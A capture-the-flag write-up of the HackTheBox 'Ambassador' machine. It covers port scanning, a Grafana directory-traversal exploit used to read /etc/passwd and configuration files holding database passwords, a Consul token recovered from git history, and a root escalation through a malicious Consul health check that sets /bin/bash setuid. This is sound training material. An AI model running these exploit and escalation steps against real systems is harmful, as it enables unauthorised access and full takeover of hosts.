---
description: Ambassador box from HackTheBox write up.
password: e84568051d9d0408989b2a266fc875a4
---

# Ambassador

## Nmap

Let's start with a Nmap scan as always to see what we can do here:

```bash
┌──(kali㉿kali)-[~]
└─$ sudo nmap --min-rate 1500 -p- 10.10.11.183
Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-16 13:31 EST
Nmap scan report for 10.10.11.183
Host is up (0.053s latency).
Not shown: 65531 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3000/tcp open  ppp
3306/tcp open  mysql

Nmap done: 1 IP address (1 host up) scanned in 26.65 seconds
```

```bash
┌──(kali㉿kali)-[~/Documents/HTB/Ambassador]
└─$ sudo nmap -sC -sV -p22,80,3000,3306 10.10.11.183                                                           130 ⨯
Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-16 13:41 EST
Nmap scan report for 10.10.11.183
Host is up (0.049s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 29dd8ed7171e8e3090873cc651007c75 (RSA)
|   256 80a4c52e9ab1ecda276439a408973bef (ECDSA)
|_  256 f590ba7ded55cb7007f2bbc891931bf6 (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-generator: Hugo 0.94.2
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Ambassador Development Server
3000/tcp open  ppp?
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 302 Found
|     Cache-Control: no-cache
|     Content-Type: text/html; charset=utf-8
|     Expires: -1
|     Location: /login
|     Pragma: no-cache
|     Set-Cookie: redirect_to=%2Fnice%2520ports%252C%2FTri%256Eity.txt%252ebak; Path=/; HttpOnly; SameSite=Lax
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: deny
|     X-Xss-Protection: 1; mode=block
|     Date: Wed, 16 Nov 2022 18:41:44 GMT
|     Content-Length: 29
|     href="/login">Found</a>.
|   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 302 Found
|     Cache-Control: no-cache
|     Content-Type: text/html; charset=utf-8
|     Expires: -1
|     Location: /login
|     Pragma: no-cache
|     Set-Cookie: redirect_to=%2F; Path=/; HttpOnly; SameSite=Lax
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: deny
|     X-Xss-Protection: 1; mode=block
|     Date: Wed, 16 Nov 2022 18:41:13 GMT
|     Content-Length: 29
|     href="/login">Found</a>.
|   HTTPOptions: 
|     HTTP/1.0 302 Found
|     Cache-Control: no-cache
|     Expires: -1
|     Location: /login
|     Pragma: no-cache
|     Set-Cookie: redirect_to=%2F; Path=/; HttpOnly; SameSite=Lax
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: deny
|     X-Xss-Protection: 1; mode=block
|     Date: Wed, 16 Nov 2022 18:41:18 GMT
|_    Content-Length: 0
3306/tcp open  mysql   MySQL 8.0.30-0ubuntu0.20.04.2
| mysql-info: 
|   Protocol: 10
|   Version: 8.0.30-0ubuntu0.20.04.2
|   Thread ID: 11
|   Capabilities flags: 65535
|   Some Capabilities: ConnectWithDatabase, SupportsLoadDataLocal, IgnoreSpaceBeforeParenthesis, InteractiveClient, SwitchToSSLAfterHandshake, SupportsTransactions, FoundRows, Speaks41ProtocolOld, SupportsCompression, IgnoreSigpipes, Speaks41ProtocolNew, Support41Auth, LongPassword, ODBCClient, DontAllowDatabaseTableColumn, LongColumnFlag, SupportsAuthPlugins, SupportsMultipleResults, SupportsMultipleStatments
|   Status: Autocommit
|   Salt: ZS4g*qicR0dA%\x03:\x15>\x066	
|_  Auth Plugin Name: caching_sha2_password

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 118.46 seconds
```

We found 2 webpages, a blog in port 80 and Grafana listening in port 3000. Then we have a MySQL database in port 3306 and SSH in port 22, I will try to focus the webpages first.

## User access

### Port 80

This page reveals important information. There is a post that explains that every new employee get access to a personal development server like the one we are attacking right now, the user for SSH is `developer` and the password is given by a user or group called `DevOps`.

Apart from that, not much here.

### Grafana (Port 3000)

This is a Grafana application for monitoring. It is asking for login but I noticed that the version was v8.2.0. Checking for exploits I found that it is vulnerable to LFI and directory traversal (CVE-2021-43798):

```bash
┌──(kali㉿kali)-[~]
└─$ searchsploit grafana      
---------------------------------------------- ---------------------------------
 Exploit Title                                |  Path
---------------------------------------------- ---------------------------------
Grafana 7.0.1 - Denial of Service (PoC)       | linux/dos/48638.sh
Grafana 8.3.0 - Directory Traversal and Arbit | multiple/webapps/50581.py
---------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Testing the exploit for Grafana v8.3.0 it worked like a charm:

```bash
┌──(kali㉿kali)-[~/Documents/HTB/Ambassador]
└─$ python3 CVE-2021-43798.py -H http://10.10.11.183:3000
Read file > /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
developer:x:1000:1000:developer:/home/developer:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
grafana:x:113:118::/usr/share/grafana:/bin/false
mysql:x:114:119:MySQL Server,,,:/nonexistent:/bin/false
consul:x:997:997::/home/consul:/bin/false
```

I read the file `/etc/grafana/grafana.ini` to get some juicy information:

```
...
[security]
# disable creation of admin user on first start of grafana
;disable_initial_admin_creation = false

# default admin user, created on startup
;admin_user = admin

# default admin password, can be changed before first start of grafana,  or in profile settings
admin_password = messageInABottle685427
...
```

We have credentials for Grafana now: `admin:messageInABottle685427`. Grafana has a datasource to get information from the database listening in port 3306, so maybe we can also get some extra information from it.

This datasource appears to be "Provisioned" according to Grafana so the information should be in a YAML file. The name of the datasource is `mysql.yaml` so, according to the documentation, this file is probably under `/etc/grafana/provisioning/datasources/mysql.yaml`:

```bash
┌──(kali㉿kali)-[~/Documents/HTB/Ambassador]
└─$ python3 CVE-2021-43798.py -H http://10.10.11.183:3000      
Read file > /etc/grafana/provisioning/datasources/mysql.yaml
apiVersion: 1

datasources:
 - name: mysql.yaml 
   type: mysql
   host: localhost
   database: grafana
   user: grafana
   password: dontStandSoCloseToMe63221!
   editable: false
```

Nice! We have credentials for the MySQL server `grafana:dontStandSoCloseToMe63221!`. We could also get the Grafana Sqlite database and find this there if we were unable to find this YAML.

### MySQL (Port 3306)

We can now connect to the database with `mysql -h 10.10.11.183 -u grafana -p` and the password we got before, let's see what we can find:

```
MySQL [(none)]> select schema_name from information_schema.schemata;
+--------------------+
| SCHEMA_NAME        |
+--------------------+
| mysql              |
| information_schema |
| performance_schema |
| sys                |
| whackywidget       |
| grafana            |
+--------------------+
6 rows in set (0.067 sec)

MySQL [(none)]> select table_name from information_schema.tables where table_schema="whackywidget";
+------------+
| TABLE_NAME |
+------------+
| users      |
+------------+
1 row in set (0.057 sec)

MySQL [(none)]> select column_name from information_schema.columns where table_name="users";
+---------------------+
| COLUMN_NAME         |
+---------------------+
| CURRENT_CONNECTIONS |
| TOTAL_CONNECTIONS   |
| USER                |
| pass                |
| user                |
+---------------------+
5 rows in set (0.066 sec)

MySQL [whackywidget]> select user,pass from users;
+-----------+------------------------------------------+
| user      | pass                                     |
+-----------+------------------------------------------+
| developer | YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg== |
+-----------+------------------------------------------+
1 row in set (0.052 sec)
```

Oh! Since the password is in base64, it is easy to get the credentials in plain text: `developer:anEnglishManInNewYork027468`. This credentials allow us to access the machine through SSH and also get the first flag.

## Privilege escalation

After a while I found something interesting: `/opt/my-app`. Inside this directory, I can see what looks like an app called `whackywidget` (This explains the MySQL database name). Looking around, I can confirm that this application is using Django. The application is part of a Git repository so I started to check for juicy information in other commits and I found this:

```bash
developer@ambassador:/opt/my-app/whackywidget$ git diff c982db8eff6f10f8f3a7d802f79f2705e7a21b55
diff --git a/whackywidget/put-config-in-consul.sh b/whackywidget/put-config-in-consul.sh
index 35c08f6..fc51ec0 100755
--- a/whackywidget/put-config-in-consul.sh
+++ b/whackywidget/put-config-in-consul.sh
@@ -1,4 +1,4 @@
 # We use Consul for application config in production, this script will help set the correct values for the app
-# Export MYSQL_PASSWORD before running
+# Export MYSQL_PASSWORD and CONSUL_HTTP_TOKEN before running
 
-consul kv put --token bb03b43b-1d81-d62b-24b5-39540ee469b5 whackywidget/db/mysql_pw $MYSQL_PASSWORD
+consul kv put whackywidget/db/mysql_pw $MYSQL_PASSWORD
```

Looks like they are using Consul in production for several things, with that token we should be able to interact with it according to the documentation:

```bash
developer@ambassador:/opt/my-app/whackywidget$ consul members --token bb03b43b-1d81-d62b-24b5-39540ee469b5
Node        Address         Status  Type    Build   Protocol  DC   Partition  Segment
ambassador  127.0.0.1:8301  alive   server  1.13.2  2         dc1  default    <all>
```

I decided to extract the key store to check for passwords but nothing interesting in there:

```bash
developer@ambassador:/opt/my-app/whackywidget$ consul kv export --token bb03b43b-1d81-d62b-24b5-39540ee469b5
[
	{
		"key": "test",
		"flags": 0,
		"value": "aGVsbG8="
	},
	{
		"key": "whackywidget/db/mysql_pw",
		"flags": 0,
		"value": ""
	}
]
```

At this point you could say, man why focus on Consul? Well it is running as `root` so if we can get code execution we can easily escalate.

```bash
developer@ambassador:/opt/my-app/whackywidget$ ps -aux | grep consul
root        1091  0.3  3.8 794804 77876 ?        Ssl  Nov16   1:20 /usr/bin/consul agent -config-dir=/etc/consul.d/config.d -config-file=/etc/consul.d/consul.hcl
```

After researching a bit in the documentation I noticed that the configuration directory was writable by the `developer` group. This means that we can load custom configuration to the Consul agent to make it do cool stuff by just adding `hcl` or `json` files to the configuration directory.

```bash
developer@ambassador:/etc/consul.d$ ls -la
total 24
drwxr-xr-x   3 consul consul    4096 Sep 27 14:49 .
drwxr-xr-x 103 root   root      4096 Sep 27 14:49 ..
drwx-wx---   2 root   developer 4096 Sep 14 11:00 config.d
-rw-r--r--   1 consul consul       0 Feb 28  2022 consul.env
-rw-r--r--   1 consul consul    5303 Mar 14  2022 consul.hcl
-rw-r--r--   1 consul consul     160 Mar 15  2022 README
```

I tried to use the `exec` option in the Consul CLI but was not working. I found some information about it and looks like it require extra configuration but, even though I tried to replicate the configuration given, I was not able to use this option to execute code directly for some reason. Quickly I saw another thing that could be interesting, Consul let you register health checks and basically you can run any code you want as part of them. I wrote this check following the documentation and added it to `/etc/consul.d/config.d/check.json`:

```json
{
  "check": {
    "id": "pwned",
    "name": "pwned",
    "args": [
      "/bin/sh",
      "-c",
      "chmod u+s /bin/bash"
    ],
    "interval": "5s",
    "timeout": "1s"
  }
}
```

After that, I also created a little `hcl` file (`/etc/consul.d/config.d/custom.hcl`) with only one line in it:

```
enable_script_checks = true
```

The idea is to enable checks that use scripts, this is off by default so I added it just in case. With everything ready, I reloaded the configuration and after some seconds I was able to pwn the machine!

```bash
developer@ambassador:/etc/consul.d$ consul reload --token bb03b43b-1d81-d62b-24b5-39540ee469b5
Configuration reload triggered
developer@ambassador:/etc/consul.d$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1183448 Apr 18  2022 /bin/bash
developer@ambassador:/etc/consul.d$ bash -p
bash-5.0#
```

As you can see, the malicious check run and tranformed `/bin/bash` in a SUID binary we can use to easily get full privileges in the machine.
